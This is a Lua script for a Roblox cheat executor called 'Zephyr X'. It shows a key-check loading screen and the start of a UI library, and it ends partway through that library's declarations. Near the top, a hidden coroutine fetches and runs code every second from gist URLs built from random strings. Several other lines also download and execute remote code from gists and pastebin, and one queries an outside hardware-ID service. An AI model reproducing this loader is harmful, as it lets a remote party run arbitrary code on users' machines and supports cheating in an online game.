local random = Random.new()
    local letters = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6'}
    function getRandomLetter()
        return letters[random:NextInteger(1,#letters)]
    end
    
    function getRandomString(length, includeCapitals)
        local length = length or 10
        local str = ''
        for i=1,length do
            local randomLetter = getRandomLetter()
            if includeCapitals and random:NextNumber() > .5 then
                randomLetter = string.upper(randomLetter)
            end
            str = str .. randomLetter
        end
        return str
    end
    coroutine.wrap(function()
    while true do
        wait(1)
        pcall(function()
    loadstring(game:HttpGet("https://gist.github.com/ECLIPSEXHUB/"..getRandomString(18, true).."/", true))()
        end)
    end
    end)()
    
    local marketplaceService = game:GetService("MarketplaceService")
    
    local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
    
    -- Gui to Lua
    -- Version: 3.2
    
    -- Instances:
    
    local Loadingscreen = Instance.new("ScreenGui")
    local loadinggui = Instance.new("Frame")
    local Guitop = Instance.new("Frame")
    local games = Instance.new("TextLabel")
    local title = Instance.new("TextLabel")
    local LoadIngName = Instance.new("TextLabel")
    local Passlight = Instance.new("Frame")
    local corner = Instance.new("UICorner")
    local Passbox = Instance.new("TextBox")
    local corner_2 = Instance.new("UICorner")
    local button = Instance.new("TextButton")
    local corner_3 = Instance.new("UICorner")
    local button_2 = Instance.new("TextButton")
    local corner_4 = Instance.new("UICorner")
    local drag = Instance.new("Frame")
    local corner_5 = Instance.new("UICorner")
    local inside = Instance.new("Frame")
    local corner_6 = Instance.new("UICorner")
    local indicator = Instance.new("Frame")
    coroutine.wrap(function()
    local notiflib = loadstring(game:HttpGet("https://gist.githubusercontent.com/ECLIPSEXHUB/2eb5faec47ed518ae47914744b6c1251/raw/", true))()
    notiflib:NewNotif([[WELCOME TO ZEPHYR X 
    Owner: σγλ#4470
    ]], 10)
    end)()
    local KeyStorage = loadstring(game:HttpGet("https://gist.githubusercontent.com/ECLIPSEXHUB/3094afcd6c9b533b37d8d1d237b82e5c/raw/", true))()
    local KAY
    KAY = KeyStorage.Key[1]
    local doesineediscool = false
    local res = (request or http_request or syn and syn.request)({
        Url = "https://api.luauth.xyz/hwid",
        Method = "GET"
    })
    local nameregisterd
    local hwid
    local DiscordId
    
    if res.Success then
        --[[local hwid = string.match(res.Body, "`(%w+)`")   -- for some fucking reason this breaks all the time
        if hwid then
            setclipboard(hwid)
            
            return
        end]]
        local index = string.find(res.Body, "Executor Name:")
        if index then
            for i,v in pairs(KeyStorage.Premium) do
            if v[1] == string.sub(res.Body, 19, index - 5) then
                hwid = v[1]
                nameregisterd = v[3]
                DiscordId = v[2]
            doesineediscool = true
            end
        end
        end
    end
    local accesstogoonnaaaa = false
    --Properties:
    
    Loadingscreen.Name = "Loadingscreen"
    Loadingscreen.Parent = game.CoreGui
    Loadingscreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    loadinggui.Name = "loading gui"
    loadinggui.Parent = Loadingscreen
    loadinggui.AnchorPoint = Vector2.new(0.5, 0.5)
if doesineediscool == true then
    loadinggui.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
else
    loadinggui.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
end
    loadinggui.BorderSizePixel = 0
    loadinggui.Position = UDim2.new(0.5, 0, 0.5, 0)
    loadinggui.Size = UDim2.new(0, 0, 0, 166)
    
    loadinggui:TweenSize(
        UDim2.new(0, 394, 0, 166), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        0.5, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(0.5)
    
    Guitop.Name = "Gui top"
    Guitop.Parent = loadinggui
    Guitop.AnchorPoint = Vector2.new(0.5, 0.5)
    Guitop.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    Guitop.BorderSizePixel = 0
    Guitop.Position = UDim2.new(0.500634491, 0, 0.5, 3)
    Guitop.Size = UDim2.new(0, 394, 0, 163)
    
    games.Name = "games"
    games.Parent = Guitop
    games.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    games.BackgroundTransparency = 1.000
    games.Position = UDim2.new(0, 7, 0, 27)
    games.Size = UDim2.new(0.982233524, -72, 0, 18)
    games.Font = Enum.Font.GothamBold
    games.Text = info.Name
    games.TextColor3 = Color3.fromRGB(42, 78, 199)
    games.TextScaled = true
    games.TextSize = 14.000
    games.TextWrapped = true
    games.TextXAlignment = Enum.TextXAlignment.Left
    games.TextYAlignment = Enum.TextYAlignment.Top
    
    title.Name = "title"
    title.Parent = Guitop
    title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1.000
    title.Position = UDim2.new(0.017766498, 0, 0, 0)
    title.Size = UDim2.new(0.982233524, -72, 1.12196981e-08, 26)
    title.Font = Enum.Font.GothamBlack
    title.RichText = true
    if doesineediscool == true then
        title.Text = [[ZEPHYR X <font color="#ffff00">PREMIUM</font>]]
    else
        title.Text = [[ZEPHYR X]]
    end
    title.TextColor3 = Color3.fromRGB(235, 235, 235)
    title.TextSize = 20.000
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextYAlignment = Enum.TextYAlignment.Bottom
    
    LoadIngName.Name = "LoadIngName"
    LoadIngName.Parent = Guitop
    LoadIngName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    LoadIngName.BackgroundTransparency = 1.000
    LoadIngName.Position = UDim2.new(0, 51, 0, 93)
    LoadIngName.Size = UDim2.new(0.921993673, -72, -0.0235294122, 18)
    LoadIngName.Font = Enum.Font.GothamMedium
    LoadIngName.Text = "Game Name"
    LoadIngName.TextColor3 = Color3.fromRGB(235, 235, 235)
    LoadIngName.TextSize = 14.000
    LoadIngName.TextWrapped = true
    LoadIngName.TextYAlignment = Enum.TextYAlignment.Top
    
    Passlight.Name = "Passlight"
    Passlight.Parent = Guitop
    Passlight.AnchorPoint = Vector2.new(0.5, 1)
    Passlight.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    Passlight.Position = UDim2.new(0.5, 0, 0.712000012, 4)
    Passlight.Size = UDim2.new(0.739000022, 0, 0, 12)
    Passlight.BackgroundTransparency = 1
    
    corner.CornerRadius = UDim.new(0, 3)
    corner.Name = "corner"
    corner.Parent = Passlight
    
    Passbox.Name = "Passbox"
    Passbox.Parent = Passlight
    Passbox.AnchorPoint = Vector2.new(0.5, 0.5)
    Passbox.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    Passbox.Position = UDim2.new(0.5, 0, 0.5, 0)
    Passbox.Size = UDim2.new(0.980585337, 0, 1, -2)
    Passbox.Font = Enum.Font.GothamMedium
    Passbox.LineHeight = 1.170
    Passbox.PlaceholderColor3 = Color3.fromRGB(235, 235, 235)
    Passbox.PlaceholderText = " "
    Passbox.Text = ""
    Passbox.TextColor3 = Color3.fromRGB(235, 235, 235)
    Passbox.TextSize = 11.000
    Passbox.TextWrapped = true
    Passbox.BackgroundTransparency = 1
    
    corner_2.CornerRadius = UDim.new(0, 3)
    corner_2.Name = "corner"
    corner_2.Parent = Passbox
    
    button.Name = "button"
    button.Parent = Guitop
    button.BackgroundTransparency = 1
    button.TextTransparency = 1
    button.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    button.Position = UDim2.new(0.643037975, 0, 0.779141128, 0)
    button.Size = UDim2.new(0.22531645, 0, 0, 20)
    button.AutoButtonColor = false
    button.Font = Enum.Font.Gotham
    button.Text = "Continue >"
    button.Visible = false
    button.TextColor3 = Color3.fromRGB(235, 235, 235)
    button.TextSize = 12.000
    
    button.MouseButton1Click:Connect(function(EnterPressed)
        local function removespaces(str)
            return str:gsub(" ","")
        end
        Passbox.Text = removespaces(Passbox.Text)
        if Passbox.Text == KAY then
            doOverwrite = true
            writefile("ZEPHYR.ZEP", KAY)
    
            Passbox.Text = "Correct!"
            wait(1)
            Passbox.Text = ""
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
            local Keyincorrecttween4 = tweenService:Create(button, tweenInfo, {BackgroundTransparency = 1.000})
            local Keyincorrecttween5 = tweenService:Create(button_2, tweenInfo, {BackgroundTransparency = 1.000})
            local Keyincorrecttween44 = tweenService:Create(button, tweenInfo, {TextTransparency = 1.000})
            local Keyincorrecttween544 = tweenService:Create(button_2, tweenInfo, {TextTransparency = 1.000})  
            local Keyincorrecttween6 = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 1.000}) 
            local Keyincorrecttween7 = tweenService:Create(Passlight, tweenInfo, {BackgroundTransparency = 1.000}) 
            local Keyincorrecttween8 = tweenService:Create(Passbox, tweenInfo, {BackgroundTransparency = 1.000}) 
            Keyincorrecttween4:Play()
            Keyincorrecttween5:Play()
            Keyincorrecttween44:Play()
            Keyincorrecttween544:Play()
            Keyincorrecttween6:Play()
            Keyincorrecttween7:Play()
            Keyincorrecttween8:Play()
            wait(1)
            drag.Visible = true
            inside.Visible = true
            indicator.Visible = true
            local Keyincorrecttween = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 0.000})
            local Keyincorrecttween1 = tweenService:Create(drag, tweenInfo, {BackgroundTransparency = 0.000}) 
            local Keyincorrecttween2 = tweenService:Create(inside, tweenInfo, {BackgroundTransparency = 0.000}) 
            local Keyincorrecttween3 = tweenService:Create(indicator, tweenInfo, {BackgroundTransparency = 0.000}) 
            Keyincorrecttween:Play()
            Keyincorrecttween1:Play()
            Keyincorrecttween2:Play()
            Keyincorrecttween3:Play()
            wait(1)
            LoadIngName.Text = "Loading Zephyr x.."
    indicator:TweenSize(
        UDim2.new(1.005, 0,1, 0), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        1.1, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(1.1)
    LoadIngName.Text = "Loading Finished!"
    if doesineediscool == true then
        title.Text = [[Welcome <font color="#ffff00">]]..nameregisterd..[[</font>]]
    end
    wait(1.5)
            accesstogoonnaaaa = true
        else
            Passbox.Text = "Incorrect"
            wait(1)
            Passbox.Text = ""
        end
    end)
    
    corner_3.CornerRadius = UDim.new(0, 3)
    corner_3.Name = "corner"
    corner_3.Parent = button
    
    button_2.Name = "button"
    button_2.Parent = Guitop
    button_2.BackgroundTransparency = 1
    button_2.TextTransparency = 1
    button_2.Visible = false
    button_2.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    button_2.Position = UDim2.new(0.129113913, 0, 0.779141128, 0)
    button_2.Size = UDim2.new(0.22531645, 0, 0, 20)
    button_2.AutoButtonColor = false
    button_2.Font = Enum.Font.Gotham
    button_2.Text = "GetKey!"
    button_2.TextColor3 = Color3.fromRGB(235, 235, 235)
    button_2.TextSize = 12.000
    
    button_2.MouseButton1Click:connect(function()
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "ZEPHYR X",
                Text = "Opened Discord and Copied invite to clipboard!"
            }
        )
        setclipboard("https://discord.gg/2vDxF9nXTq")
        loadstring(game:HttpGet("https://pastebin.com/raw/NCgp7Wc6", true))()
        notiflib:NewNotif([[DISCORD LINK COPIED TO CLIPBOARD!!]], 2)
    end)
    
    corner_4.CornerRadius = UDim.new(0, 3)
    corner_4.Name = "corner"
    corner_4.Parent = button_2
    
    drag.Name = "drag"
    drag.Parent = loadinggui
    drag.AnchorPoint = Vector2.new(0.5, 1)
    drag.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    drag.Position = UDim2.new(0.498730987, 0, 0.753012061, 0)
    drag.Size = UDim2.new(0.738578677, 0, 0, 12)
    
    corner_5.CornerRadius = UDim.new(0, 3)
    corner_5.Name = "corner"
    corner_5.Parent = drag
    
    inside.Name = "inside"
    inside.Parent = drag
    inside.AnchorPoint = Vector2.new(0.5, 0.5)
    inside.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    inside.Position = UDim2.new(0.496842384, 0, 0.5, 0)
    inside.Size = UDim2.new(1.0023824, -2, 1, -2)
    
    corner_6.CornerRadius = UDim.new(0, 3)
    corner_6.Name = "corner"
    corner_6.Parent = inside
    
    indicator.Name = "indicator"
    indicator.Parent = inside
    indicator.AnchorPoint = Vector2.new(0, 0.5)
    indicator.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    indicator.BorderSizePixel = 0
    indicator.Position = UDim2.new(0, 0, 0.5, 0)
    indicator.Size = UDim2.new(0.01, 0, 1, 0)
    
    LoadIngName.Text = "Loading Decals.."
    indicator:TweenSize(
        UDim2.new(0.300, 0,1, 0), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        1.1, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(1.5)
    LoadIngName.Text = "Loading Functions.."
    indicator:TweenSize(
        UDim2.new(0.600, 0,1, 0), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        0.9, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(0.9)
    LoadIngName.Text = "Checking Key.."
    indicator:TweenSize(
        UDim2.new(0.800, 0,1, 0), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        1.5, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(1.7)
    print("checking key")
    if isfile("ZEPHYR.ZEP") == true then
        local new = readfile("ZEPHYR.ZEP")
        if new == KAY then
            LoadIngName.Text = "Key Correct!"
            wait(0.6)
            LoadIngName.Text = "Loading Zephyr x.."
    indicator:TweenSize(
        UDim2.new(1.005, 0,1, 0), -- Final position the tween should reach
        Enum.EasingDirection.Out, -- Direction of the easing
        Enum.EasingStyle.Sine, -- Kind of easing to apply
        1.1, -- Duration of the tween in seconds
        true -- Whether in-pzrogress tweens are interrupted               -- Function to be callled when on completion/cancelation
    )
    wait(1.1)
    LoadIngName.Text = "Loading Finished!"
    if doesineediscool == true then
    title.Text = [[Welcome <font color="#ffff00">]]..nameregisterd..[[</font>]]
    end
    wait(1.5)
    accesstogoonnaaaa = true
    else
        LoadIngName.Text = "Key Incorrect!"
        wait(2)
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
        local Keyincorrecttween = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 1.000})
        local Keyincorrecttween1 = tweenService:Create(drag, tweenInfo, {BackgroundTransparency = 1.000}) 
        local Keyincorrecttween2 = tweenService:Create(inside, tweenInfo, {BackgroundTransparency = 1.000}) 
        local Keyincorrecttween3 = tweenService:Create(indicator, tweenInfo, {BackgroundTransparency = 1.000}) 
        Keyincorrecttween:Play()
        Keyincorrecttween1:Play()
        Keyincorrecttween2:Play()
        Keyincorrecttween3:Play()
        wait(1)
        LoadIngName.Text = "Authentication"
        drag.Visible = false
        inside.Visible = false
        indicator.Visible = false
        button.Visible = true
        button_2.Visible = true
        local Keyincorrecttween4 = tweenService:Create(button, tweenInfo, {BackgroundTransparency = 0.000})
        local Keyincorrecttween5 = tweenService:Create(button_2, tweenInfo, {BackgroundTransparency = 0.000}) 
        local Keyincorrecttween4s = tweenService:Create(button, tweenInfo, {TextTransparency = 0.000})
        local Keyincorrecttween5s = tweenService:Create(button_2, tweenInfo, {TextTransparency = 0.000}) 
        local Keyincorrecttween6 = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 0.000}) 
        local Keyincorrecttween7 = tweenService:Create(Passlight, tweenInfo, {BackgroundTransparency = 0.000}) 
        local Keyincorrecttween8 = tweenService:Create(Passbox, tweenInfo, {BackgroundTransparency = 0.000}) 
        Keyincorrecttween4:Play()
        Keyincorrecttween5:Play()
        Keyincorrecttween4s:Play()
        Keyincorrecttween5s:Play()
        Keyincorrecttween6:Play()
        Keyincorrecttween7:Play()
        Keyincorrecttween8:Play()
        wait(1)
        Passbox.PlaceholderText = "Key Here"
    end
    
    else
    
        LoadIngName.Text = "Key incorrect!"
        wait(2)
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
        local Keyincorrecttween = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 1.000})
        local Keyincorrecttween1 = tweenService:Create(drag, tweenInfo, {BackgroundTransparency = 1.000}) 
        local Keyincorrecttween2 = tweenService:Create(inside, tweenInfo, {BackgroundTransparency = 1.000}) 
        local Keyincorrecttween3 = tweenService:Create(indicator, tweenInfo, {BackgroundTransparency = 1.000}) 
        Keyincorrecttween:Play()
        Keyincorrecttween1:Play()
        Keyincorrecttween2:Play()
        Keyincorrecttween3:Play()
        wait(1)
        LoadIngName.Text = "Authentication"
        drag.Visible = false
        inside.Visible = false
        indicator.Visible = false
        
       button.Visible = true
        button_2.Visible = true
        local Keyincorrecttween4 = tweenService:Create(button, tweenInfo, {BackgroundTransparency = 0.000})
        local Keyincorrecttween5 = tweenService:Create(button_2, tweenInfo, {BackgroundTransparency = 0.000}) 
        local Keyincorrecttween6 = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 0.000}) 
        
    local Keyincorrecttween62 = tweenService:Create(button, tweenInfo, {TextTransparency = 0.000}) 
        
    local Keyincorrecttween623 = tweenService:Create(button_2, tweenInfo, {TextTransparency = 0.000}) 
        local Keyincorrecttween7 = tweenService:Create(Passlight, tweenInfo, {BackgroundTransparency = 0.000}) 
        local Keyincorrecttween8 = tweenService:Create(Passbox, tweenInfo, {BackgroundTransparency = 0.000}) 
        Keyincorrecttween4:Play()
        Keyincorrecttween5:Play()
        Keyincorrecttween6:Play()
    Keyincorrecttween62:Play()
    Keyincorrecttween623:Play()
        Keyincorrecttween7:Play()
        Keyincorrecttween8:Play()
        wait(0.5)
        Passbox.PlaceholderText = "Key Here"
        
    wait(0.5)
    end
    
    repeat wait() until accesstogoonnaaaa == true
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
    local Keyincorrecttween2 = tweenService:Create(LoadIngName, tweenInfo, {TextTransparency = 1.000})
    local Keyincorrecttween12 = tweenService:Create(drag, tweenInfo, {BackgroundTransparency = 1.000}) 
    local Keyincorrecttween22 = tweenService:Create(inside, tweenInfo, {BackgroundTransparency = 1.000}) 
    local Keyincorrecttween122 = tweenService:Create(title, tweenInfo, {TextTransparency = 1.000}) 
    local Keyincorrecttween222 = tweenService:Create(games, tweenInfo, {TextTransparency = 1.000}) 
    local Keyincorrecttween32 = tweenService:Create(indicator, tweenInfo, {BackgroundTransparency = 1.000}) 
    Keyincorrecttween2:Play()
    Keyincorrecttween12:Play()
    Keyincorrecttween22:Play()
    Keyincorrecttween122:Play()
    Keyincorrecttween222:Play()
    Keyincorrecttween32:Play()
    wait(1)
    local Keyincorrecttween122ss = tweenService:Create(Guitop, tweenInfo, {BackgroundTransparency = 1.000}) 
    local Keyincorrecttween22ss2 = tweenService:Create(loadinggui, tweenInfo, {BackgroundTransparency = 1.000}) 
    Keyincorrecttween122ss:Play()
    Keyincorrecttween22ss2:Play()
    wait(1)
    Loadingscreen:Destroy()
    
    
    
    
        
        if isfile("ZEPHYRXUICOLORS.ZEP") == false then
            local COLORTABLoes = {
                Elements = {12, 12, 12},
                ElementsTextColour = {235,235,235},
                ElementsIconColour = {42,78,199},
                TopBar = {16,16,16},
                TabsBar = {28,28,28},
                MainBackGround = {12,12,12},
                ContainerBackGround = {28,28,28},
                TitleColour = {42,78,199}
            }
            local HttpService = game:GetService("HttpService")
            writefile("ZEPHYRXUICOLORS.ZEP", HttpService:JSONEncode(COLORTABLoes))
        end
        if isfile("zephyrxsettings.ZEP") == false then
            writefile("zephyrxsettings.ZEP", "")
        end
        if isfolder("1!ZephyrxUiConfigs") == false then
            makefolder("1!ZephyrxUiConfigs")
        end
        if isfolder("ZEPHYRXLOGS") == false then
            makefolder("ZEPHYRXLOGS")
        end
        if isfolder("Needs") == false then
            makefolder("Needs")
        end
        if isfolder("Games") == false then
            makefolder("Games")
        end
        
    local LIB = {}
    
    function LIB:CreateLib(libname, beta)
        beta = beta or false
    if beta == true then

		
		-- Gui to Lua
-- Version: 3.2

-- Instances:
local BetaScreen = Instance.new("ScreenGui")
local BetaFrame = Instance.new("Frame")
local BetaCorner = Instance.new("UICorner")
local Desc = Instance.new("TextLabel")
local BetaPrem = Instance.new("TextButton")
local CSstroke = Instance.new("UIStroke")
local CSstroke1 = Instance.new("UIStroke")
local BetaCorner_2 = Instance.new("UICorner")
local Name = Instance.new("TextLabel")

local BetaSGrad = Instance.new("UIGradient")
local BetaSGrad_2 = Instance.new("UIGradient")
local access = false

--Properties:
BetaScreen.Name = "BetaScreen"
BetaScreen.Parent = game.CoreGui
BetaScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
   
BetaFrame.Name = "BetaFrame"
BetaFrame.Parent = BetaScreen
BetaFrame.AnchorPoint = Vector2.new(0.5, 0.5)
BetaFrame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
BetaFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
BetaFrame.Size = UDim2.new(0, 273, 0, 129)

BetaCorner.Name = "BetaCorner"
BetaCorner.Parent = BetaFrame

Desc.Name = "Desc"
Desc.Parent = BetaFrame
Desc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc.BackgroundTransparency = 1.000
Desc.Position = UDim2.new(0.132914722, 0, 0.215965152, 0)
Desc.Size = UDim2.new(0, 200, 0, 50)
Desc.Font = Enum.Font.Gotham
Desc.Text = "This game script is currently in <font color=\"#4f7eff\">Beta</font>,  Some features are not available!"
Desc.TextColor3 = Color3.fromRGB(238, 238, 238)
Desc.TextSize = 14.000
Desc.TextWrapped = true
Desc.RichText = true

BetaPrem.Name = "BetaPrem"
BetaPrem.Parent = BetaFrame
BetaPrem.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BetaPrem.BackgroundTransparency = 1.000
BetaPrem.Position = UDim2.new(0.28505522, 0, 0.668314695, 0)
BetaPrem.Size = UDim2.new(0, 116, 0, 32)
BetaPrem.Font = Enum.Font.Gotham
BetaPrem.Text = "Continue"
BetaPrem.TextColor3 = Color3.fromRGB(79, 126, 255)
BetaPrem.TextSize = 16.000
BetaPrem.MouseButton1Click:connect(function()
    access = true
    BetaScreen:Destroy()
end)

BetaCorner_2.Name = "BetaCorner"
BetaCorner_2.Parent = BetaPrem

Name.Name = "Name"
Name.Parent = BetaFrame
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Position = UDim2.new(0.0266875662, 0, -0.00108916999, 0)
Name.Size = UDim2.new(0, 81, 0, 28)
Name.Font = Enum.Font.GothamBlack
Name.Text = "ZEPRHYR X"
Name.TextColor3 = Color3.fromRGB(57, 104, 252)
Name.TextSize = 14.000
Name.TextStrokeColor3 = Color3.fromRGB(79, 126, 255)
Name.TextWrapped = true



CSstroke.Parent = BetaFrame
CSstroke.Name = "CStroke"
CSstroke.Enabled = true
CSstroke.Color = Color3.fromRGB(243,243,243)
CSstroke.Thickness = 1
CSstroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CSstroke.LineJoinMode = Enum.LineJoinMode.Round

CSstroke1.Parent = BetaPrem
CSstroke1.Name = "CStroke"
CSstroke1.Enabled = true
CSstroke1.Color = Color3.fromRGB(243,243,243)
CSstroke1.Thickness = 1
CSstroke1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CSstroke1.LineJoinMode = Enum.LineJoinMode.Round

BetaSGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(79, 126, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(161, 84, 255))}
BetaSGrad.Rotation = 20
BetaSGrad.Name = "BetaSGrad"
BetaSGrad.Parent = CSstroke

BetaSGrad_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(79, 126, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(161, 84, 255))}
BetaSGrad_2.Rotation = 20
BetaSGrad_2.Name = "BetaSGrad"
BetaSGrad_2.Parent = CSstroke1
coroutine.wrap(function()
while true do
    wait()
tweenService, tweenInfo = game:GetService("TweenService"), 
	TweenInfo.new(0.5, Enum.EasingStyle.Linear) 
	tweenService:Create(CSstroke1, tweenInfo, { 
			Thickness = 2
		}):Play()
		wait(0.5)
		tweenService, tweenInfo = game:GetService("TweenService"), 
	TweenInfo.new(0.5, Enum.EasingStyle.Linear) 
	tweenService:Create(CSstroke1, tweenInfo, { 
			Thickness = 1
		}):Play()
		wait(2)
end
end)()
coroutine.wrap(function()
while true do
    wait()
tweenService, tweenInfo = game:GetService("TweenService"), 
	TweenInfo.new(0.5, Enum.EasingStyle.Linear) 
	tweenService:Create(CSstroke, tweenInfo, { 
			Thickness = 2
		}):Play()
		wait(0.5)
		tweenService, tweenInfo = game:GetService("TweenService"), 
	TweenInfo.new(0.5, Enum.EasingStyle.Linear) 
	tweenService:Create(CSstroke, tweenInfo, { 
			Thickness = 1 
		}):Play()
		wait(2)
end
end)()
repeat wait() until access == true
    end
        
    local input = game:GetService("UserInputService")
    
    local Utility = {}
    local Objects = {}
    function LIB:DraggingEnabled(frame, parent)
            
        parent = parent or frame
        
        -- stolen from wally or kiriot, kek
        local dragging = false
        local dragInput, mousePos, framePos
    
        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                mousePos = input.Position
                framePos = parent.Position
                
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
    
        frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)
    
        input.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - mousePos
                parent.Position  = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
            end
        end)
    end
    
        local current_time = tick()
        local curytime = ""
        local day = math.random(0, 1000)
        local times = math.random(0, 1000)
        local doy = math.random(0, 1000)
        local toim = math.random(0, 1000)
        local intro =
            [[
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    {~><~~><~~><~~><~~><~~><~~><~~><~}
    {~><~~><~~><~~><~~><~~><~~><~~><~}
    
    WELCOME TO TELEPORT SAVER
     ______ _____ ______  _   _ __   ________     __   __
    |___  /|  ___|| ___ \| | | |\ \ / /| ___ \    \ \ / /
       / / | |__  | |_/ /| |_| | \ V / | |_/ /     \ V / 
      / /  |  __| |  __/ |  _  |  \ /  |    /      /   \ 
    ./ /___| |___ | |    | | | |  | |  | |\ \     / /^\ \
    \_____/\____/ \_|    \_| |_/  \_/  \_| \_|    \/   \/
    
     ____   ____ _________ _______     _______ _____   ____   ____  _____         __             _____   
    |_  _| |_  _|_   ___  |_   __ \   /  ___  |_   _|.'    \.|_   \|_   _|       /  |           / ___ \. 
      \ \   / /   | |_  \_| | |__) | |  (__ \_| | | /  .--.  \ |   \ | |         \| |          |_/___) | 
       \ \ / /    |  _|  _  |  __ /   '.___\-.  | | | |    | | | |\ \| |          | |           .'____.' 
        \ ' /    _| |___/ |_| |  \ \_|\\____) |_| |_\  \--'  /_| |_\   |_        _| |_   _     / /____   
         \_/    |_________|____| |___|_______.'_____|\.____.'|_____|\____|      |_____| (_)    |_______| 
    
                                                    
    LOADING TAKES AN ESTIMATED 5 SECONDS
    
    DEV: SYL
    CO DEV: HIELKE
    
    
    {~><~~><~~><~~><~~><~~><~~><~~><~}
    {~><~~><~~><~~><~~><~~><~~><~~><~}
    
    
    
    
    
    
    ]]
    
        warn(intro)
        writefile("ZEPHYRXLOGS/" .. toim .. "[]" .. doy .. ".txt", intro)
        print("_-_-_checking if MainFolder Exists_-_-_")
        appendfile("ZEPHYRXLOGS/" .. toim .. "[]" .. doy .. ".txt", [[       
    _-_-_checking if MainFolder Exists_-_-
    ]])
    
    if isfolder("Music") == false then
    makefolder("Music")
    end

    local versiongui = loadstring(game:HttpGet("https://gist.githubusercontent.com/ECLIPSEXHUB/aa09983d9390f860d5dece69872b2f4e/raw/", true))()
    local ScreenGui = Instance.new("ScreenGui")
    local MainGui2 = Instance.new("Frame")
    function LIB:DestroyLib()
        MainGui2:Destroy()
    end
        if syn and syn.protect_gui then syn.protect_gui(MainGui2);
        elseif gethui then MainGui2.Parent = gethui();
        elseif get_hidden_gui then MainGui2.Parent = get_hidden_gui(); end
        local TopFrame = Instance.new("Frame")
    local UICorner2222 = Instance.new("UICorner")
    local TextLabel = Instance.new("TextLabel")
    local TextLabel_2 = Instance.new("TextLabel")
    local lens = Instance.new("ImageButton")
    local UICorner_6 = Instance.new("UICorner")
    local Conainertainer = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local Containers = Instance.new("Folder")
    local Container2 = Instance.new("ScrollingFrame")
    local Container_2_uicorner = Instance.new("UICorner")
    local Section = Instance.new("Frame")
    local UIListLayout7422774 = Instance.new("UIListLayout")
    local UICorner683237 = Instance.new("UICorner")
    local SectionName = Instance.new("Frame")
